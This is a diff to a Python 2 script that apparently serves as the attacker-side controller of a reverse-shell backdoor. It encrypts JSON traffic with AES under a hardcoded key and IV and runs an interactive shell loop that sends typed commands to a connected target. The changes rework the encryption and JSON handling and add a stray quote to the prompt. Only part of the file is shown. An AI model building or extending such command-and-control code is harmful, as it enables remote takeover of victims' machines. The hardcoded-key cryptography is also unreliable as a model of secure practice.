@@ -5,7 +5,6 @@ import socket
 import json
 import base64
 from Crypto.Cipher import AES
-
 def do_encrypt(message):
     obj = AES.new('This is a key123', AES.MODE_CBC, 'This is an IV456')
     ciphertext = obj.encrypt(message)
@@ -17,16 +16,18 @@ def do_decrypt(ciphertext):
     return message
 
 countshot = 1
-
 def send(data):
-	json_data = json.dumps(do_encrypt(data))
-	target.send(json_data)
+	json_data = json.dumps(data)
+	cipherdata = do_encrypt(json_data)
+	target.send(cipherdata)
+
 def recv():
 	data = ""
 	while True:
 		try:
 			data = data + target.recv(1024)
-			return json.loads(do_decrypt(data)) 
+			text = do_decrypt(data)
+			return json.loads(text) 
 		except ValueError:
 		       continue 
 
@@ -34,7 +35,7 @@ def recv():
 def shell():
 	global countshot
 	while True:
-		command = raw_input("* shell#~%s: " % str(ip))
+		command = raw_input("* shel\'l#~%s: " % str(ip))
 		send(command)
 		if command =='q':
 			break
@@ -82,6 +83,7 @@ server()
 
 shell()
 sock.close()
+
 
 
 
